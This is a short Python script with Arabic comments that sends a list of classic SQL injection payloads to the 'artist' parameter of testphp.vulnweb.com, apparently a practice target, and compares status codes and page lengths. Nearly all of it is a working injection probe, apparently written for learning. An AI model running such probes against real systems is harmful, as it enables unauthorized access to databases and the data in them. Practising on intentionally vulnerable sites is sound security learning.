import requests   # مكتبة للتعامل مع HTTP

# الهدف
url = "http://testphp.vulnweb.com/artists.php"

# قائمة Payloads نجربها
payloads = [
    "1",             # طبيعي
    "1'",            # نكسر الكويري
    "1 OR 1=1",      # استعلام صحيح دايمًا
    "1' OR '1'='1"   # نسخة مشهورة من الحقن
]

for p in payloads:
    # نرسل الطلب مع الباراميتر
    r = requests.get(url, params={"artist": p})
    
    print(f"[*] tested: {p}")
    print(f"[+] code: {r.status_code}")
    print(f"[+] page length: {len(r.text)}")
    print("="*50)
